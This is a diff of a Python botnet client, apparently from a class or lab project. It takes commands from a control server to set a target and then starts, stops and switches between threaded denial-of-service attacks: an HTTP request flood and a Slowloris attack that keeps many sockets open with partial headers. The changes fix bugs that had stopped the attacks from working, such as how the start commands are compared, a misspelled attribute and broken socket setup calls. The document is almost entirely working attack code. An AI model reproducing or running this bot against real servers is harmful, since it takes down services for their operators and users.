@@ -78,35 +78,38 @@ class Bot():
 							self.authenticated = True
 							print(f'authenticated as bot')
 							self.sock.send("getstate:".encode(ENCODING))
-					elif request[0] == 'changeip':                              #did they decide to include port?
+					elif request[0] == 'changeip':                           
 						self.target_address = request[1]
 						print(f'new target received {self.target_address}')
 					elif request[0] == 'changeattk':
 						self.attack_type = int(request[1])
 						print(f'attack type changed to {self.attack_type}')
 					elif request[0] == 'startattk':    
-						if request[1] == True:      
+						if request[1] == 'True':      
 							self.attacking = True
 							print(f"starting attack {self.attack_type} on target {self.target_address}")
 							if self.attack_type == 1:
-								for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+								for _ in range(self.threads):									
 									t = RequestAttack(self.target_address)
 									t.start() #t.join
 									self.active_threads.append(t)
 							if self.attack_type == 2:
-								for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+								for _ in range(self.threads):										
 									t = SlowLorisAttack(self.target_address)	
 									t.start() #t.join?
 									self.active_threads.append(t)
-							print(f"attack {self.attack_type} running")
-						if request[1] == False:
+							print(f"attack {self.attack_type} running with {threading.active_count()} threads active")
+						if request[1] == 'False':
 							self.attacking = False
 					elif request[0] == 'stopattk':
 						self.attacking = False
 						print('stopping attack')
 						for t in self.active_threads:
 							t.stop()
-						print("attack stopped")
+							self.active_threads = []
+						print(f"attack stopped")
+						time.sleep(1)
+						print(f'{threading.active_count()} threads active')
 					else:
 						print(f'Cannot handle request from {sock_addr}\nrequest:{recv_data}')
 						response = f'{request[0]}:error:cannot handle request'.encode(ENCODING)
@@ -195,7 +198,7 @@ class RequestAttack(threading.Thread):
 		return self.stopper.is_set()
 	
 	def run(self):     
-		while True:                                                     
+		while self.stopped() == False:                                                     
 			try:	
 				connection = http.client.HTTPConnection(self.target, self.port, timeout = 1)		### hardcoded port for our target server
 				url = self.create_url()
@@ -210,8 +213,7 @@ class RequestAttack(threading.Thread):
 			except Exception as e:
 				print(e)
 				sys.exit()
-			if self.stopped() == True:
-				sys.exit()
+
 	  
 ''' End of referenced code '''
 
@@ -224,19 +226,19 @@ class SlowLorisAttack(threading.Thread):
 		super().__init__()
 		self.target = target
 		self.port = 9999
-		self.regualr_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+		self.regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
 					"Accept-language: en-US,en,q=0.5"]
-		self.socket_count = 100 #can adjust
+		self.socket_count = 10 #can adjust
 		self.stopper = threading.Event()
 
 
 	def init_socket(self):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		sock.settimeout(4)
+		sock.settimeout(20)
 		sock.connect((self.target,self.port))
-		sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+		sock.send("GET /?{} HTTP/1.1\r\n".format(randint(0,2000)).encode('UTF-8'))
 
-		for header in regular_headers:
+		for header in self.regular_headers:
 			sock.send('{}\r\n'.format(header).encode('UTF-8'))
 
 		return sock
@@ -253,24 +255,24 @@ class SlowLorisAttack(threading.Thread):
 
 		for _ in range(self.socket_count):
 			try:
-				sock = self.init_socket(self)
+				sock = self.init_socket()
 			except socket.error:
 				break
 			socket_list.append(sock)
 
-		while True:
+		while self.stopped() == False:
 				try:
 					print(f"Sending {len(socket_list)} Keep-Alive Headers")
 					for s in socket_list:
 						try:
-							s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+							s.send("X-a {}\r\n".format(randint(1,5000)).encode('UTF-8'))
 						except socket.error:
 							socket_list.remove(s)
 					n = self.socket_count - len(socket_list)
 					for _ in range(n):
 						print(f"Re-creating {n} Sockets...")
 						try:
-							s = self.init_socket(self)
+							s = self.init_socket()
 							if s:
 								socket_list.append(s)
 						except socket.error:
@@ -281,8 +283,7 @@ class SlowLorisAttack(threading.Thread):
 				except Exception as e:
 						print(e)
 						sys.exit()
-				if self.stopped() == True:
-					sys.exit()
+
 
 ''' End of referenced code '''
 
